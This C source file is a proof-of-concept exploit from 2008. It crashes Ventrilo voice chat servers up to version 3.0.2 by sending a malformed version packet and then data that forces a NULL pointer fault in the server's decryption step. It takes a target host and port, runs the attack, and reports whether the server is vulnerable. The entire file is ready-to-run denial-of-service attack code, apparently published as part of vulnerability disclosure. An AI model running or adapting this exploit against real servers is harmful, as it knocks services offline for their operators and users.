/*
    Copyright 2008 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <time.h>
#include "ventrilo_algo.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close       closesocket
    #define sleep       Sleep
    #define ONESEC      1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #include <sys/times.h>

    #define ONESEC      1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define BUFFSZ      0xffff
#define PORT        3784
#define TIMEOUT     5



int connerr(void);
int putxx(u8 *data, u32 num, int bits);
int putss(u8 *data, u8 *val, int len);
int send_ventrilo(int sd, ventrilo_key_ctx *client, u8 *buff, int len);
int recv_ventrilo(int sd, ventrilo_key_ctx *server, u8 *buff);
int rndxx(u8 *data, int len, u32 *seed, int fixlen);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);




int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u32     seed;
    int     sd,
            len;
    u16     port    = PORT;
    u8      *buff,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Ventrilo <= 3.0.2 NULL pointer "VER"\n"
        "by Luigi Auriemma and Andre Malm\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <server> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target:   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    seed  = time(NULL);
    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    printf("- connect\n");
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    printf("- send a wrong version packet\n");
    p = buff;
    p += putxx(p, 0, 32);
    p += rndxx(p, 16, &seed, 1);
    p += rndxx(p, 32, &seed, 1);
    p += rndxx(p, 32, &seed, 1);

    if(send_ventrilo(sd, NULL, buff, p - buff) < 0) connerr();
    len = recv_ventrilo(sd, NULL, buff);
    if(len < 0) connerr();

    printf("- send some data for forcing the decryption function\n");
    p = buff;
    p += putxx(p, 0, 32);   // can be anything, it's enough to send something
    if(send_ventrilo(sd, NULL, buff, p - buff) < 0) connerr();
    len = recv_ventrilo(sd, NULL, buff);
    close(sd);

    printf("- wait some seconds\n");
    sleep(ONESEC * 2);

    printf("- test server:\n");
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer)) < 0) {
        printf("\n  Server IS vulnerable!!!\n");
    } else {    // the following message will appear if the server is attached to a debugger too
        printf("\n  Server doesn't seem vulnerable\n");
    }
    close(sd);
    free(buff);
    return(0);
}



int connerr(void) {
    printf("\nError: the server has closed the connection, it's probably not vulnerable\n");
    exit(1);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = num >> (i << 3);
    }
    return(bytes);
}



int putss(u8 *data, u8 *val, int len) {
    strncpy(data, val, len);
    return(len);
}



int send_ventrilo(int sd, ventrilo_key_ctx *client, u8 *buff, int len) {
    u8      tmp[2];

    if(client) {
        ventrilo_enc(client, buff, len);
    } else {
        ventrilo_first_enc(buff, len);
    }

    tmp[0] = len >> 8;
    tmp[1] = len;
    if(send(sd, tmp,  2,   0) != 2)   return(-1);
    if(send(sd, buff, len, 0) != len) return(-1);
    return(0);
}



int recv_ventrilo(int sd, ventrilo_key_ctx *server, u8 *buff) {
    int     t;
    u16     i,
            len;

    if(timeout(sd, TIMEOUT) < 0) return(-1);
    if(recv(sd, (void *)&len, 1, 0)     < 0)  return(-1);
    if(timeout(sd, TIMEOUT) < 0) return(-1);
    if(recv(sd, (void *)&len + 1, 1, 0) < 0)  return(-1);
    len = ntohs(len);

    for(i = 0; i != len; i += t) {
        t = recv(sd, buff + i, len - i, 0);
        if(t <= 0) return(-1);
    }

    if(server) {
        ventrilo_dec(server, buff, len);
    } else {
        ventrilo_first_dec(buff, len);
    }
    return(len);
}



int rndxx(u8 *data, int len, u32 *seed, int fixlen) {
    u32     rnd,
            size;
    u8      *p;
    static const char table[] =
                "0123456789"
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz";

    rnd  = *seed;
    size = len;

    if(!fixlen) {
        len = rnd % len;
        if(len < 3) len = 3;
    }
    for(p = data; --len; p++) {
        rnd = (rnd * 0x343FD) + 0x269EC3;
        rnd = ~((rnd >> 1) - 1);
        *p = table[rnd % (sizeof(table) - 1)];
    }
    for(len = p - data; len < size; len++) {
        *p++ = 0;
    }
    *seed = rnd;
    return(p - data);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n",
                host);
            exit(1);
        } else host_ip = *(u32 *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


